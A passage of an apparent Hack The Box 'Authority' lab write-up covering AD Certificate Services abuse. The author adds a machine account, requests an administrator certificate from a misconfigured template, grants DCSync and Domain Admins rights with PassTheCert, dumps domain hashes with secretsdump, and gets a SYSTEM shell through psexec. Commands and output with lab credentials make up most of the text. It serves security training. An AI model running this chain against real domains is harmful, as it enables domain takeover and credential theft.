    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
      Object Control Permissions
        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519

```
- From the output above, I saw that Domain computers also have enrollment rights on this certificate template
- so if I can add a computer to the domain that I have control over, it will automatically be added to the Domain computers group, meaning that machine will then have enrollment rights on this certificate

- Researching more on Exploiting Certificate services, I found some really cool resources
	- [Certified Pre-Owned. Active Directory Certificate Services… | by Will Schroeder | Posts By SpecterOps Team Members](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
	- [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) | by Oliver Lyak | IFCR](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)

- from the `whomami /all` command, I saw that the svc_ldap account have the SeMachineAccountPrivilege

> The **SeMachineAccountPrivilege** is a user right that allows users to add computer accounts to the domain. The **MS-DS-Machine-Account-Quota** is an attribute that specifies the number of computer accounts that a user can create in the domain
> By default, the SeMachineAccountPrivilege is granted to Authenticated Users, and the MS-DS-Machine-Account-Quota is set to 10. This means that any authenticated user can join up to 10 computers to the domain.

- I will use `impacket-addcomputer`, (we can also use powermad) for this
- In the addcomputer help section that it will be automatically added to the Domain computers group, so no need to specify it in the command

![](assets/Authority_assets/Pasted%20image%2020230821225325.png)

- so I added the use GRAYPC to the domain
```shell
┌──(kali㉿kali)-[~/Scripts]
└─$ impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'GR4YPC' -computer-pass 'Passw0rd'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account GR4YPC$ with password Passw0rd.
```

![](assets/Authority_assets/Pasted%20image%2020230823000305.png)

- then I can run certipy to request the certificate

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ certipy req -u 'GR4YPC$@authority.htb' -p 'Passw0rd' -dc-ip 10.10.11.222 -ca 'AUTHORITY-CA' -template 'CorpVPN' -debug
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'gr4ypc.pfx'

```
- looking at the help section, I saw that I can provide an alternative UPN, and request a certificate as the user including the administrator (because of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`)

![](assets/Authority_assets/Pasted%20image%2020230822235816.png)

- so I then I provide the UPN of the administrator and then generate a certificate as the admin

```
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ certipy req -u 'GR4YPC$@authority.htb' -p 'Passw0rd' -dc-ip 10.10.11.222 -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn administrator@authority.htb -debug
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```
- Attempting to request a TGT as the administrator using this certificate, I am met with the error below

![](assets/Authority_assets/Pasted%20image%2020230822190331.png)

- After googling this error, I came across this blog post [Authenticating with certificates when PKINIT is not supported - Almond Offensive Security Blog](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html), which explained the possible reasons behind the error

![](assets/Authority_assets/Pasted%20image%2020230823000641.png)

- this blog post also utilized a tool known as [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python) to authenticate to an LDAP server using the certificate generated
- before I can use the PasstheCert tool , I have to extract the key and cert from the pfx file and I can do that using Certipy

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ certipy cert -pfx administrator.pfx -nokey -out administrator.crt
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'administrator.crt'
                                                                                                                                                                       
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ certipy cert -pfx administrator.pfx -nocert -out administrator.key
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Writing private key to 'administrator.key'

```

- Testing this, I can try to add a machine to the domain using the certificate

```shell
python3 passthecert.py -action add_computer -crt administreator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -computer-name GR4YPC$ -computer-pass Passw0rd
```
- Looking through the help menu, I'm also able to grant DC Sync access rights to the svc_ldap user and the user to the Domain admin group as well

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ python3 passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -target svc_ldap -elevate
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Granted user 'svc_ldap' DCSYNC rights!
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands

# add_user_to_group 
svc_ldap "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK
```

![](assets/Authority_assets/Pasted%20image%2020230823191003.png)

- I can go ahead and dump the hashes in the domain now
```
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ impacket-secretsdump -just-dc 'svc_ldap:lDaP_1n_th3_cle4r!@10.10.11.222' -outputfile dcsync_hashes         
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:09dd9e3b63ad57ea6c86f88b488b7378:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:4530f7da5780ab7e32febb9d86e447390fed8adfc46fe3cc27caefeb076609d8
AUTHORITY$:aes128-cts-hmac-sha1-96:8c4c63885c124efc2dfbb11c9a5f9378
AUTHORITY$:des-cbc-md5:dadfd5efa1d9eafe
[*] Cleaning up...
```

![](assets/Authority_assets/Pasted%20image%2020230823131940.png)

- I can pass the hash of the administrator using psexec and get admin access

![](assets/Authority_assets/Pasted%20image%2020230823133937.png)

- since I added the svc_ldap user to the Domain Admins group, I can just login as the user and I have administrative access as well

```                               
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ impacket-psexec 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!@10.10.11.222'                  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.11.222.....
[*] Found writable share ADMIN$
[*] Uploading file CXgxXuni.exe
[*] Opening SVCManager on 10.10.11.222.....
[*] Creating service hoHq on 10.10.11.222.....
[*] Starting service hoHq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```
- I can finally read the root flag.

![](assets/Authority_assets/Pasted%20image%2020230823193251.png)


